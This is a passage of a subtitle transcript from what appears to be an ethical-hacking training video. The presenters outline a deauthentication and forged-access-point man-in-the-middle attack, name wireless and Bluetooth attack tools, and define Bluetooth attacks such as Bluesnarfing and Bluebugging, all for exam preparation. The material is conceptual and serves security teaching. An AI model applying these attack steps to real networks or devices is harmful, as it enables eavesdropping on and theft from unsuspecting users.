that.\n\n501\n00:22:40.367 --> 00:22:41.638\nHere we go, look at that, okay.\n\n502\n00:22:41.638 --> 00:22:43.305\nSo back, hello mom.\n\n503\n00:22:43.305 --> 00:22:44.485\n&gt;&gt; [LAUGH]\n&gt;&gt; Here I am,\n\n504\n00:22:44.485 --> 00:22:46.459\nITProTV sending you a postcard,\nthere we go.\n\n505\n00:22:46.459 --> 00:22:47.557\n&gt;&gt; There we go, okay.\n&gt;&gt; Mom always loves it when I\n\n506\n00:22:47.557 --> 00:22:48.162\ngive her a shout-out.\n\n507\n00:22:48.162 --> 00:22:50.223\n&gt;&gt; [LAUGH]\n&gt;&gt; Even though she doesn't know what I do\n\n508\n00:22:50.223 --> 00:22:53.291\nand doesn't ever pay attention, but\nshe loves the theory behind it,\n\n509\n00:22:53.291 --> 00:22:54.030\nso there you go.\n\n510\n00:22:54.030 --> 00:22:57.890\nSo Man-in-the-Middle attack, how do we\nbreak down a Man-in-the-Middle attack?\n\n511\n00:22:57.890 --> 00:22:59.680\nIt's a good thing I had\nnothing up on that other one,\n\n512\n00:22:59.680 --> 00:23:01.290\nin the lab environment or anything.\n\n513\n00:23:01.290 --> 00:23:03.060\nWho knows what I would've\nhad going on over there.\n\n514\n00:23:03.060 --> 00:23:04.023\nActually at the lab,\n\n515\n00:23:04.023 --> 00:23:07.348\nthe Linux environment that we're\ngonna use to do the mobile hacking.\n\n516\n00:23:07.348 --> 00:23:09.716\nWe're actually gonna create\nthe attack package and\n\n517\n00:23:09.716 --> 00:23:12.742\ncreate a little attack app that you\ncan deploy on a mobile network.\n\n518\n00:23:12.742 --> 00:23:14.539\nGonna show you guys how to do\nthat in Linux, [CROSSTALK].\n\n519\n00:23:14.539 --> 00:23:15.134\nYou got a little sneak peak there.\n\n520\n00:23:15.134 --> 00:23:16.764\n&gt;&gt; We'll we could've.\n\n521\n00:23:16.764 --> 00:23:18.594\nNow all we had was a sneak\npeak on the logon credential.\n\n522\n00:23:18.594 --> 00:23:21.547\n&gt;&gt; [LAUGH]\n&gt;&gt; Cuz I shut it down cuz it has to reset.\n\n523\n00:23:21.547 --> 00:23:24.710\nBut, we are gonna show you how to\ndo that in an upcoming episode.\n\n524\n00:23:24.710 --> 00:23:27.030\nWe talk about hacking mobile cell,\nthat should be kinda cool.\n\n525\n00:23:27.030 --> 00:23:28.490\nYou wanna tune in for that.\n\n526\n00:23:28.490 --> 00:23:31.100\nMike's also gonna make\na little chicken cacciatore\n\n527\n00:23:31.100 --> 00:23:34.680\noff on the side here on one of\nthe burners we have set up in the back.\n\n528\n00:23:34.680 --> 00:23:37.168\nAnd he's gonna show you how to prep\nthe chicken so it comes out nice,\n\n529\n00:23:37.168 --> 00:23:37.918\nsoft, and tender.\n\n530\n00:23:37.918 --> 00:23:39.138\n&gt;&gt; Absolutely.\n&gt;&gt; It's like debone and cook,\n\n531\n00:23:39.138 --> 00:23:39.804\nall in one step, right?\n\n532\n00:23:39.804 --> 00:23:42.250\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so Man-in-the Middle attack.\n\n533\n00:23:42.250 --> 00:23:42.860\nLet's talk about this.\n\n534\n00:23:42.860 --> 00:23:45.299\nSo, traditionally we break\nthis down into six steps.\n\n535\n00:23:45.299 --> 00:23:46.314\nWe've identified them for you.\n\n536\n00:23:46.314 --> 00:23:50.406\nAgain, keep in mind if we go to\nthe trouble of enumerating steps for you,\n\n537\n00:23:50.406 --> 00:23:54.030\ntell you what's happening,\nkinda walk you through a process,\n\n538\n00:23:54.030 --> 00:23:56.334\nusually there's a reason behind that.\n\n539\n00:23:56.334 --> 00:23:58.744\nUsually a good idea to take\naway from that conversation.\n\n540\n00:23:58.744 --> 00:23:59.906\nAt least high-level awareness.\n\n541\n00:23:59.906 --> 00:24:01.264\nOf what's going on.\n\n542\n00:24:01.264 --> 00:24:05.650\nThere may be something specific in\na certain step we talk about or call out.\n\n543\n00:24:05.650 --> 00:24:07.970\nWant to make sure you're aware of that.\n\n544\n00:24:07.970 --> 00:24:11.180\nAnd, in general, a process like this is\ngood to be able to narrate through and\n\n545\n00:24:11.180 --> 00:24:11.690\nunderstand.\n\n546\n00:24:11.690 --> 00:24:13.570\nI can potentially see drag and\n\n547\n00:24:13.570 --> 00:24:16.935\ndrop kind of questions,\nasking about series of steps.\n\n548\n00:24:16.935 --> 00:24:20.551\nI could see a multiple choice\nquestion where you're asked\n\n549\n00:24:20.551 --> 00:24:24.178\nto choose a certain action\nattributed to a certain phase.\n\n550\n00:24:24.178 --> 00:24:28.381\nI could see no questions\nbeing asked at all.\n\n551\n00:24:28.381 --> 00:24:30.644\nIt's hard to say for\nsure what will happen, but\n\n552\n00:24:30.644 --> 00:24:33.940\nit's always good to have that\nknowledge and be aware of that.\n\n553\n00:24:33.940 --> 00:24:36.398\nAnd even just thinking about that\nwould be something to consider.\n\n554\n00:24:36.398 --> 00:24:40.200\nSo Man-in-the Middle attack, step one,\nthat attacker sniffs the victim's wireless\n\n555\n00:24:40.200 --> 00:24:45.410\nparameters, the MAC address, the SSIDs,\nthe number of channels, things like that.\n\n556\n00:24:45.410 --> 00:24:46.913\nSo we're getting all that stuff.\n\n557\n00:24:46.913 --> 00:24:50.305\nThen we send a DEAUTH request to the\nvictim with the spoofed source addresses\n\n558\n00:24:50.305 --> 00:24:51.264\nof the victim's AP.\n\n559\n00:24:51.264 --> 00:24:54.728\nA DEAUTH request essentially says hey,\nwe're dropping you, right?\n\n560\n00:24:54.728 --> 00:24:57.150\n[LAUGH] So, goodbye, good luck,\nhandshake, golden watch.\n\n561\n00:24:57.150 --> 00:24:57.789\n&gt;&gt; Yeah, that's right.\n\n562\n00:24:57.789 --> 00:24:58.465\n&gt;&gt; See you later.\n\n563\n00:24:58.465 --> 00:25:01.025\nWe DEAUTH the victim, so\nwe knock them out, and\n\n564\n00:25:01.025 --> 00:25:03.275\nthen we start to search all the channels.\n\n565\n00:25:03.275 --> 00:25:06.005\nThe victim is DEAUTH right, and we'll then\nstart to search for the new valid IP.\n\n566\n00:25:06.005 --> 00:25:07.776\nEssentially we kick them out, right?\n\n567\n00:25:07.776 --> 00:25:08.301\n&gt;&gt; Right.\n\n568\n00:25:08.301 --> 00:25:10.594\n&gt;&gt; And then, the attacker steps in, and\n\n569\n00:25:10.594 --> 00:25:14.391\neither sets up a forge IP on a new\nchannel with the original MAC so\n\n570\n00:25:14.391 --> 00:25:18.568\nthat it looks like the original,\none that they want to reconnect to.\n\n571\n00:25:18.568 --> 00:25:20.653\nAnd then when the victim reconnects,\n\n572\n00:25:20.653 --> 00:25:25.213\nthey're connecting not the official real\nAP, but rather the one that we control,\n\n573\n00:25:25.213 --> 00:25:28.226\nand now we're going to route\nall the traffic through.\n\n574\n00:25:28.226 --> 00:25:30.073\n&gt;&gt; Right.\n&gt;&gt; And so we knock you off and\n\n575\n00:25:30.073 --> 00:25:31.447\nthen reassociate you,\n\n576\n00:25:31.447 --> 00:25:35.649\nbut by doing that we slip a rogue access\npoint in, what we call forged AP.\n\n577\n00:25:35.649 --> 00:25:40.680\nThat allows us then to monitor all\nthe traffic either passively or actively.\n\n578\n00:25:40.680 --> 00:25:44.520\nTaking what we want from it, mirroring\nthe packets doing whatever we want to do.\n\n579\n00:25:44.520 --> 00:25:48.480\nOr even injecting data into the stream,\nif we choose to if we decide to go active.\n\n580\n00:25:48.480 --> 00:25:50.434\nSo important to know that, Step 4,\n\n581\n00:25:50.434 --> 00:25:53.525\nStep 5 after the victim\nsuccessfully associates to the,\n\n582\n00:25:53.525 --> 00:25:58.084\nwhat they think is the re-association of\nthe AP, but it's really now the forged AP.\n\n583\n00:25:58.084 --> 00:26:02.192\nWe then spoof the victim and connect you\nout on their behalf to the original AP.\n\n584\n00:26:02.192 --> 00:26:02.784\n&gt;&gt; Right.\n\n585\n00:26:02.784 --> 00:26:03.690\n&gt;&gt; So it's a two-step process.\n\n586\n00:26:03.690 --> 00:26:07.323\nThe victim is connected to\nour in the middle relay.\n\n587\n00:26:07.323 --> 00:26:08.058\n&gt;&gt; Mm-hm.\n\n588\n00:26:08.058 --> 00:26:11.460\n&gt;&gt; And then we're connecting from\nthe relay back to the original AP on their\n\n589\n00:26:11.460 --> 00:26:13.746\nbehalf, allowing the traffic to be routed,\nbut\n\n590\n00:26:13.746 --> 00:26:17.440\nallowing us to control it and to see it,\nwhich is kind of interesting.\n\n591\n00:26:17.440 --> 00:26:20.360\nAnd then the attacker sits, obviously,\nin step 6, between the access point and\n\n592\n00:26:20.360 --> 00:26:24.940\nthe victim, and is able to listen in to\nall the traffic, which is cool as well.\n\n593\n00:26:24.940 --> 00:26:27.770\nSo we have the ability to do that here,\ncrack it, by the way.\n\n594\n00:26:27.770 --> 00:26:29.510\nWe'll do that, so let's keep that in mind.\n\n595\n00:26:29.510 --> 00:26:33.934\nThat is a tool we potentially can use for\nthat if we want to do that.\n\n596\n00:26:33.934 --> 00:26:34.855\nCan I do like a whole\nbunch of hand signals?\n\n597\n00:26:34.855 --> 00:26:37.422\nLike this, and go to this, and\n&gt;&gt; [LAUGH]\n\n598\n00:26:37.422 --> 00:26:38.088\n&gt;&gt; Look at this,\n\n599\n00:26:38.088 --> 00:26:39.423\nmove some of this back here.\n\n600\n00:26:39.423 --> 00:26:40.674\nYou weren't supposed to see that,\nby the way.\n\n601\n00:26:40.674 --> 00:26:41.453\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n602\n00:26:41.453 --> 00:26:42.420\n&gt;&gt; It's just me being silly.\n\n603\n00:26:42.420 --> 00:26:46.670\nAll right, so wireless attacks, all kinds\nof different ones we can propagate here.\n\n604\n00:26:46.670 --> 00:26:48.160\nWe wanna be thinking about things.\n\n605\n00:26:48.160 --> 00:26:49.750\nWe talked about rogue access points.\n\n606\n00:26:49.750 --> 00:26:51.765\nWe actually were just talking about\nthem with regards to attacks,\n\n607\n00:26:51.765 --> 00:26:54.215\none of the interesting things\npeople don't know about\n\n608\n00:26:54.215 --> 00:26:55.515\nis we can create rogue access points.\n\n609\n00:26:55.515 --> 00:26:56.985\nThat's not the part people don't know.\n\n610\n00:26:56.985 --> 00:26:59.152\nYeah, we know we can\nprobably clone them and\n\n611\n00:26:59.152 --> 00:27:01.212\npropagate them using a physical device.\n\n612\n00:27:01.212 --> 00:27:02.205\nWe can make them software-based as well,\n\n613\n00:27:02.205 --> 00:27:03.453\nwe're talking about the man\nin the middle to attack.\n\n614\n00:27:03.453 --> 00:27:06.308\nAnd the FAQ was sent to create\nthat fake access point and\n\n615\n00:27:06.308 --> 00:27:11.097\nchannel all the traffic through it through\nthe DEAUTH, and then the reassociation.\n\n616\n00:27:11.097 --> 00:27:14.297\nBut you know, a lot of times people don't\nrealize we can use USB devices to create\n\n617\n00:27:14.297 --> 00:27:15.307\nrogue access points as well.\n\n618\n00:27:15.307 --> 00:27:16.660\nWe have those also.\n\n619\n00:27:16.660 --> 00:27:18.970\nWe could plug it in essentially and\njust have it run.\n\n620\n00:27:18.970 --> 00:27:22.330\nSo there's all these different ways,\na little pocket sized rogue access point.\n\n621\n00:27:22.330 --> 00:27:23.770\nSo all sorts of different ones.\n\n622\n00:27:23.770 --> 00:27:27.600\nYou have a plethora,\na cornucopia of rogue access point\n\n623\n00:27:27.600 --> 00:27:31.650\noptions that you can choose to\nengage in and consume, if you wish.\n\n624\n00:27:31.650 --> 00:27:32.950\nSo just keep that in mind.\n\n625\n00:27:32.950 --> 00:27:34.950\nWe can set up the fake hotspots,\nthe evil twins.\n\n626\n00:27:34.950 --> 00:27:39.020\nWe've talked about that and doing\nthe cloning, just another way to do that.\n\n627\n00:27:39.020 --> 00:27:41.800\nRemember Aircrack-ng, as I said,\nor Aircrack, can be used for\n\n628\n00:27:41.800 --> 00:27:43.800\na lot of these things, so\njust reminding you of that.\n\n629\n00:27:43.800 --> 00:27:47.030\nThat massive suite of tools\nthat we often can use and\n\n630\n00:27:47.030 --> 00:27:48.650\nwe see in both Linux and Windows.\n\n631\n00:27:48.650 --> 00:27:49.925\nWe've talked about that.\n\n632\n00:27:49.925 --> 00:27:51.603\nI know you were gonna try and\nprovide some of the links for that stuff.\n\n633\n00:27:51.603 --> 00:27:52.158\n&gt;&gt; Mm-hm.\n\n634\n00:27:52.158 --> 00:27:56.718\n&gt;&gt; So we did talk about KisMAC as a tool\nlimited with regards to what wireless\n\n635\n00:27:56.718 --> 00:28:00.320\ndrivers it does initialize,\nbut just bringing that up.\n\n636\n00:28:00.320 --> 00:28:04.830\nI mention Cain and Abel for web cracking,\nor WEP cracking, excuse me, and wireless,\n\n637\n00:28:04.830 --> 00:28:09.460\nI used Cain to do an ARP flood in one\nof the prior episode demonstrations.\n\n638\n00:28:09.460 --> 00:28:12.350\nProbably a good tool for\nyou to be generically aware of.\n\n639\n00:28:12.350 --> 00:28:13.210\nYou can download that.\n\n640\n00:28:13.210 --> 00:28:14.800\nIt's one you can use for free.\n\n641\n00:28:14.800 --> 00:28:16.440\nNot really hard to find.\n\n642\n00:28:16.440 --> 00:28:20.153\nWireless Security Auditors is\nanother good tool from L Com Soft.\n\n643\n00:28:20.153 --> 00:28:22.074\nThat is cool with regards\nto a lot of this.\n\n644\n00:28:22.074 --> 00:28:24.003\nThere's all this different stuff.\n\n645\n00:28:24.003 --> 00:28:26.668\nWe could do this on wireless,\nas well, we often overlook.\n\n646\n00:28:26.668 --> 00:28:30.233\nAlthough I've made a point to try to go\nout of my way to stress either wireless\n\n647\n00:28:30.233 --> 00:28:34.550\nand mobile goes together today, much like\nCloud and Virtualization go together.\n\n648\n00:28:34.550 --> 00:28:38.140\nBut think about the fact that we do have\ntools, on the mobile platform, we can use.\n\n649\n00:28:38.140 --> 00:28:40.160\nI've mentioned that I have\napps that can do this stuff.\n\n650\n00:28:40.160 --> 00:28:43.540\nPenetrate Pro is an Android\napp that let's you do this and\n\n651\n00:28:43.540 --> 00:28:45.180\nwork on the Android platform.\n\n652\n00:28:45.180 --> 00:28:47.240\nSo it's something to think about.\n\n653\n00:28:47.240 --> 00:28:50.750\nAgain, depending on what your using,\nobviously it may or may not make sense.\n\n654\n00:28:50.750 --> 00:28:52.635\nBut just wanna call that out for you.\n\n655\n00:28:52.635 --> 00:28:56.490\nWe did talk about KisMAT as\nan example of a wireless sniffer.\n\n656\n00:28:56.490 --> 00:29:00.280\nThere's all sorts of different stuff out\nthere, just I mentioned probably 15 or\n\n657\n00:29:00.280 --> 00:29:03.790\n20 tools as we go through,\nBack Track Simulator, WiHack.\n\n658\n00:29:03.790 --> 00:29:06.820\nThese are wireless hacking tools\non mobile platforms as well.\n\n659\n00:29:07.850 --> 00:29:09.310\nSo just some additional ones.\n\n660\n00:29:09.310 --> 00:29:10.370\nBluetooth hacking.\n\n661\n00:29:10.370 --> 00:29:13.830\nNo good conversation about hacking\nwould be complete without talking\n\n662\n00:29:13.830 --> 00:29:14.760\nabout Bluetooth.\n\n663\n00:29:14.760 --> 00:29:17.990\nI believe that we do have a list that\nwe wanna go to on Mike's machine.\n\n664\n00:29:17.990 --> 00:29:20.050\nThat gives us, there we go,\nsome of that stuff.\n\n665\n00:29:20.050 --> 00:29:23.540\nSo just gave you a little general\nstatement about Bluetooth there.\n\n666\n00:29:23.540 --> 00:29:25.010\nBluetooth devices connect and\n\n667\n00:29:25.010 --> 00:29:27.910\ncommunicate wirelessly through ad\nhoc networks known as Piconets.\n\n668\n00:29:27.910 --> 00:29:30.480\nA lot of people don't realize\nthat's what we call them, and so\n\n669\n00:29:30.480 --> 00:29:32.340\nI just thought I'd throw that out\nthere for you just so you'd know,\n\n670\n00:29:32.340 --> 00:29:34.660\nand then we've got some terminology here.\n\n671\n00:29:34.660 --> 00:29:36.300\nAnd in addition, it's kinda fun to say.\n\n672\n00:29:36.300 --> 00:29:37.450\n&gt;&gt; They are fun to say, aren't they?\n\n673\n00:29:37.450 --> 00:29:40.480\n&gt;&gt; I'm gonna go Bluesmack somebody,\nthat can get you into a lot of trouble,\n\n674\n00:29:40.480 --> 00:29:41.540\npotentially.\n\n675\n00:29:41.540 --> 00:29:45.620\nBut we'll leave the implications of\nthat off to the side for the moment.\n\n676\n00:29:45.620 --> 00:29:49.702\nSo, Bluesmacking, Bluejacking,\nBlue Snarfing, Bluesniffing, Bluebugging,\n\n677\n00:29:49.702 --> 00:29:52.934\nBlueprinting, MAC spoof attacking,\nwhich is not as much fun, and\n\n678\n00:29:52.934 --> 00:29:56.131\nof course Man-in-the Middle,\nwhich we'll talk about as well.\n\n679\n00:29:56.131 --> 00:29:57.886\nSo, let's go up and\ntalk about these real quickly.\n\n680\n00:29:57.886 --> 00:30:00.058\nSo, you wanna take Bluesmacking there,\nsir?\n\n681\n00:30:00.058 --> 00:30:01.058\n&gt;&gt; [LAUGH] No.\n\n682\n00:30:01.058 --> 00:30:01.675\n&gt;&gt; You don't?\n\n683\n00:30:01.675 --> 00:30:02.754\nYou don't wanna do that one?\n\n684\n00:30:02.754 --> 00:30:07.916\nAll right, so Bluesmacking [INAUDIBLE] is\nserves attack, as you can see we overflow\n\n685\n00:30:07.916 --> 00:30:13.240\nthe Bluetooth-enabled device with just\nrandom packets, causing it to crash.\n\n686\n00:30:13.240 --> 00:30:18.458\nKeep in mind that a lot of these devices\nas we talked about with the whole\n\n687\n00:30:18.458 --> 00:30:23.866\nidea in sniffing where we can overwhelm\nthe memory buffer in the switch.\n\n688\n00:30:23.866 --> 00:30:26.887\nSo we overwhelm the cam table dynamically,\nflooding the switch and\n\n689\n00:30:26.887 --> 00:30:28.960\nessentially failing it open, right?\n\n690\n00:30:28.960 --> 00:30:30.748\nThe same idea applies with these devices.\n\n691\n00:30:30.748 --> 00:30:34.290\nThey are caching this\ninformation in memory and\n\n692\n00:30:34.290 --> 00:30:37.420\nthere's a limit to what we can port\nin there quickly and process and\n\n693\n00:30:37.420 --> 00:30:42.076\nif we don't pay attention to this,\nwe can actually crash the device,\n\n694\n00:30:42.076 --> 00:30:45.120\nwhich can happen, so\nhence the concept of Bluesmacking.\n\n695\n00:30:45.120 --> 00:30:48.190\nBluejacking, the art of sending\nunsolicited messages over Bluetooth to\n\n696\n00:30:48.190 --> 00:30:50.760\na Bluetooth, or\nmultiple Bluetooth enabled devices.\n\n697\n00:30:50.760 --> 00:30:51.703\nSo, we could do that.\n\n698\n00:30:51.703 --> 00:30:52.592\nBlue Snarfing,\n\n699\n00:30:52.592 --> 00:30:56.783\ntheft of information from a wireless\ndevice through a Bluetooth connection.\n\n700\n00:30:56.783 --> 00:31:00.006\nThis is what got Paris Hilton in trouble\nseveral years back if you remember.\n\n701\n00:31:00.006 --> 00:31:03.303\nSomebody was able to Blue Snarf and\nBluejack her device, among all the other\n\n702\n00:31:03.303 --> 00:31:06.614\nthings that they may or may not have\ndone to her, that's kind of hard to say.\n\n703\n00:31:06.614 --> 00:31:09.612\n&gt;&gt; [LAUGH]\n&gt;&gt; Blue Sniffing, proof of concept code\n\n704\n00:31:09.612 --> 00:31:14.934\nfor a Bluetooth wardriving utility which\nis kind of interesting to read up on that.\n\n705\n00:31:14.934 --> 00:31:18.179\nYou can look it up on the web,\nit's actually pretty cool.\n\n706\n00:31:18.179 --> 00:31:20.354\nAnd then Bluebugging.\n\n707\n00:31:20.354 --> 00:31:21.142\nI think it's what we're up to, right?\n\n708\n00:31:21.142 --> 00:31:25.025\nYeah, Bluebugging,\nit's like I saw it on the Olympics and\n\n709\n00:31:25.025 --> 00:31:27.054\nthey do it in the NFL, as well.\n\n710\n00:31:27.054 --> 00:31:29.668\nThey have the line for\nthe World Record, Olympic Record, so\n\n711\n00:31:29.668 --> 00:31:33.009\nthat's how they track it we do one of\nthose Caps, could you get on that for us?\n\n712\n00:31:33.009 --> 00:31:34.792\nIs that something you and\nMegan could put your heads together and\n\n713\n00:31:34.792 --> 00:31:35.783\ndo when you're not Pokemon-ing,\n\n714\n00:31:35.783 --> 00:31:37.711\nor whatever it is you're doing when\nyou're not doing stuff with us?\n\n715\n00:31:37.711 --> 00:31:38.486\n&gt;&gt; [LAUGH] Could you do that?\n\n716\n00:31:38.486 --> 00:31:41.450\nThat would be so cool,\nif you did you have a tracker light so\n\n717\n00:31:41.450 --> 00:31:45.519\nit would automatically know where I was\nand I wouldn't have to worry about not-\n\n718\n00:31:45.519 --> 00:31:47.387\n&gt;&gt; Absolutely, appearing prepared,\n\n719\n00:31:47.387 --> 00:31:51.035\ncuz we don't want the people out\nthere to think that I'm not prepared.\n\n720\n00:31:51.035 --> 00:31:52.540\n&gt;&gt; [LAUGH]\n&gt;&gt; Even though I am just making\n\n721\n00:31:52.540 --> 00:31:53.565\nit up as I go, totally.\n\n722\n00:31:53.565 --> 00:31:55.271\n&gt;&gt; [LAUGH]\n&gt;&gt; So Bluebugging, right,\n\n723\n00:31:55.271 --> 00:31:58.264\nremotely accessing as you can see\nBluetooth-enabled devices and\n\n724\n00:31:58.264 --> 00:31:59.233\nusing its features.\n\n725\n00:31:59.233 --> 00:32:03.094\nYou're essentially, if you think about it,\nyou're backdooring and routing it.\n\n726\n00:32:03.094 --> 00:32:05.410\nEssentially to get in and take it over.\n\n727\n00:32:05.410 --> 00:32:08.230\nSo we're accessing remotely and\ncontrolling it.\n\n728\n00:32:08.230 --> 00:32:11.280\nSo we can call that blueremoting\nis supposed to Bluebugging.\n\n729\n00:32:11.280 --> 00:32:15.680\nThen BluePrinting, collecting information\nabout Bluetooth enabled devices.\n\n730\n00:32:15.680 --> 00:32:19.700\nThis is where you go in and essentially\ndownload the config information, so\n\n731\n00:32:19.700 --> 00:32:22.090\nyou could check on the OS version.\n\n732\n00:32:22.090 --> 00:32:25.210\nYou'll figure out whether or not you may\nbe able to gain an advantage by going into\n\n733\n00:32:25.210 --> 00:32:29.200\nusing some sort of an attack platform\nlike metasploit or whatever it may be.\n\n734\n00:32:29.200 --> 00:32:33.440\nSo this is the ability to be able to\nget that information and understand it.\n\n735\n00:32:33.440 --> 00:32:35.920\nMAC spoof attacking,\nwe've talked about this before.\n\n736\n00:32:35.920 --> 00:32:38.890\nIntercepting data intended for\nother Bluetooth-enabled devices.\n\n737\n00:32:38.890 --> 00:32:41.570\nBeing able to redirect it or\nsomehow claim it's you.\n\n738\n00:32:41.570 --> 00:32:44.830\nAnd then we talked about Man-in-the-Middle\nand impersonation attacks modifying data\n\n739\n00:32:44.830 --> 00:32:47.790\nbetween Bluetooth enabled\ndevices on the Bluetooth network\n\n740\n00:32:47.790 --> 00:32:50.936\nwould be a man-in-the-middle attack but\nspecific, in this case, to Bluetooth.\n\n741\n00:32:50.936 --> 00:32:54.340\nThe man-in-the-middle attack concept we\nwent through was really just a generic\n\n742\n00:32:54.340 --> 00:32:56.650\nway that would happen on\nwireless networks overall.\n\n743\n00:32:56.650 --> 00:33:00.370\nWhen we apply it to Bluetooth it's just\nspecifically between Bluetooth devices but\n\n744\n00:33:00.370 --> 00:33:01.800\nit's essentially the same idea, right?\n\n745\n00:33:01.800 --> 00:33:03.020\nIt really doesn't change.\n\n746\n00:33:03.020 --> 00:33:05.740\nYou just want to be aware of that,\nthat is kind of cool but\n\n747\n00:33:05.740 --> 00:33:08.540\nwe also have the Bluetooth modes, I think\nthat was also on the bottom of that list.\n\n748\n00:33:08.540 --> 00:33:10.020\nWe wanted to actually go back to that.\n\n749\n00:33:10.020 --> 00:33:12.380\nSo if we could take a look at that for\none more second.\n\n750\n00:33:12.380 --> 00:33:16.910\nSorry about that, that was something I\nshould have mentioned while we were there.\n\n751\n00:33:16.910 --> 00:33:20.320\nWhen we have Bluetooth in\nthe stack kind of setting up and\n\n752\n00:33:20.320 --> 00:33:24.280\nhow we associate with it and\nhow we could interact, discover and pair.\n\n753\n00:33:24.280 --> 00:33:28.430\nWe just wanna make note of and be aware\nof the different modes under discovery\n\n754\n00:33:28.430 --> 00:33:30.100\nrelated concept, discoverable modes.\n\n755\n00:33:30.100 --> 00:33:33.360\nWe have three, you could see discoverable,\nlimited discoverable, non-discoverable,\n\n756\n00:33:33.360 --> 00:33:34.310\na kind of self explanatory.\n\n757\n00:33:34.310 --> 00:33:36.906\n&gt;&gt; Right.\n&gt;&gt; If you think about discoverable being\n\n758\n00:33:36.906 --> 00:33:39.810\nfully inquiry response and\na back and forth,\n\n759\n00:33:39.810 --> 00:33:42.650\nhey I'm here and yeah, I'll let you talk.\n\n760\n00:33:42.650 --> 00:33:44.745\nLimited discoverable is visible for\na certain period.\n\n761\n00:33:44.745 --> 00:33:48.650\nNon-discoverable is essentially stealth,\nnever answers questions for\n\n762\n00:33:48.650 --> 00:33:49.330\ninquiries scan.\n\n763\n00:33:49.330 --> 00:33:51.740\nWe essentially are turned off,\nnobody knows we're there.\n\n764\n00:33:51.740 --> 00:33:52.840\nAnd then pairing modes right?\n\n765\n00:33:52.840 --> 00:33:54.600\nWhether we associate or don't associate.\n\n766\n00:33:54.600 --> 00:33:57.375\nNon-pairable and pairable,\nwill pair on request,\n\n767\n00:33:57.375 --> 00:33:59.220\nnon-pairable rejects\nevery pairing request.\n\n768\n00:33:59.220 --> 00:34:02.425\nSo this is kinda like singles\nnight out at the bar as well.\n\n769\n00:34:02.425 --> 00:34:04.210\n&gt;&gt; [LAUGH] Cuz depending\non the level of alcohol and\n\n770\n00:34:04.210 --> 00:34:07.050\nthe amount of money that's\nflowing back and forth you may or\n\n771\n00:34:07.050 --> 00:34:09.210\nmay not wind up with a pairing\nmode that's favorable to you.\n\n772\n00:34:09.210 --> 00:34:10.670\nSo you may just wanna think about that.\n\n773\n00:34:10.670 --> 00:34:15.080\nAnd discoverability is also a potential\nissue depending on how much you've had to\n\n774\n00:34:15.080 --> 00:34:20.790\ndrink and how far and how limited the beer\ngoggle focus may be at any point in time.\n\n775\n00:34:20.790 --> 00:34:23.100\nIs that something people\ntalk about these days?\n\n776\n00:34:23.100 --> 00:34:23.600\n&gt;&gt; Yeah, I think so, yes.\n\n777\n00:34:23.600 --> 00:34:24.820\n&gt;&gt; That's like a generational thing for\nus.\n\n778\n00:34:24.820 --> 00:34:26.300\nI don't know if people talk\nabout beer goggles anymore.\n\n779\n00:34:26.300 --> 00:34:27.110\n&gt;&gt; The beer goggles, yeah, no, no.\n\n780\n00:34:27.110 --> 00:34:29.240\n&gt;&gt; Yeah, no they do still?\n\n781\n00:34:29.240 --> 00:34:32.400\nAnyway, so if you know what I'm talking\nabout, great, if not, then okay,\n\n782\n00:34:32.400 --> 00:34:33.120\nwho cares, right?\n\n783\n00:34:33.120 --> 00:34:35.190\nJust point of reference.\n\n784\n00:34:35.190 --> 00:34:36.976\nJust keep in mind that the association and\n\n785\n00:34:36.976 --> 00:34:40.653\nthe pairability discussions in terms of\ndiscoverability are actually important for\n\n786\n00:34:40.653 --> 00:34:42.450\nyou to have a sense of\nthose modes as well.\n\n787\n00:34:42.450 --> 00:34:45.967\nAgain, that's knowledge that we may\nintuitively kind of just sense and think,\n\n788\n00:34:45.967 --> 00:34:48.914\nokay, yeah I know I've got to somehow\nfind the Bluetooth device and\n\n789\n00:34:48.914 --> 00:34:51.567\nI have to agree to connect to\nit when somebody connects to me.\n\n790\n00:34:51.567 --> 00:34:54.503\nBut you may not stop and actually think\nabout what that is and how it works and\n\n791\n00:34:54.503 --> 00:34:57.171\nthis is kind of that knowledge and\nit's that understanding there.\n\n792\n00:34:57.171 --> 00:35:00.125\nSo keep in mind the threats associated\nwith Bluetooth are essentially the same\n\n793\n00:35:00.125 --> 00:35:01.990\nkind of threats we see everywhere else.\n\n794\n00:35:01.990 --> 00:35:04.270\nWe've talked about the different\nkinds of attacks that can occur.\n\n795\n00:35:04.270 --> 00:35:06.250\nThe one we didn't mention\nis malicious code.\n\n796\n00:35:06.250 --> 00:35:07.360\nWe can have malicious code,\n\n797\n00:35:07.360 --> 00:35:11.110\nin general malware that operates\non any of these platforms.\n\n798\n00:35:11.110 --> 00:35:14.450\nAnd also protocol vulnerabilities,\nthis is something to consider as well.\n\n799\n00:35:14.450 --> 00:35:18.210\nBad implementation or\nincorrect implementation of the stack or\n\n800\n00:35:18.210 --> 00:35:20.950\nnetwork related stuff\ncan lead to problems.\n\n801\n00:35:20.950 --> 00:35:22.568\nSo this is something else to consider.\n\n802\n00:35:22.568 --> 00:35:24.650\nYou got Sky Hook, good.\n\n803\n00:35:24.650 --> 00:35:26.090\nTools like Phone Snoop.\n\n804\n00:35:26.090 --> 00:35:28.920\nPhone Snoop, excuse me,\na Bluetooth hacking tool.\n\n805\n00:35:28.920 --> 00:35:32.760\nSo Phone Snoop, S-N-O-O-P,\nPhone Snoop would be a good one.\n\n806\n00:35:32.760 --> 00:35:36.400\nAlso, BlueScanner, kind of a classic one\nthat a lot of people will take a look at.\n\n807\n00:35:36.400 --> 00:35:37.890\nWe get all sorts of\ngood information there.\n\n808\n00:35:37.890 --> 00:35:40.070\nSo you got Aircrack up there, I see that.\n\n809\n00:35:40.070 --> 00:35:42.410\nBH BlueJack, that's also another good one.\n\n810\n00:35:42.410 --> 00:35:45.090\nThat's I think it's a where is that?\n\n811\n00:35:45.090 --> 00:35:47.980\nCross Zeus I want to say or\nsomething like that?\n\n812\n00:35:47.980 --> 00:35:49.020\nYou'll look it up.\n\n813\n00:35:49.020 --> 00:35:50.880\nThat's another one that may be cool.\n\n814\n00:35:50.880 --> 00:35:54.580\nBT Crawler, BT Scanner are also\ninteresting ones for Bluetooth.\n\n815\n00:35:54.580 --> 00:35:58.290\nSo it just maybe something to consider and\nthink about.\n\n816\n00:35:58.290 --> 00:36:01.560\nBut you know defending against Bluetooth\nhacking is really the same concept.\n\n817\n00:36:01.560 --> 00:36:05.730\nIt's all the blocking and tackling we\noften engage in around just standard\n\n818\n00:36:05.730 --> 00:36:08.150\nnetwork 101, security 101, 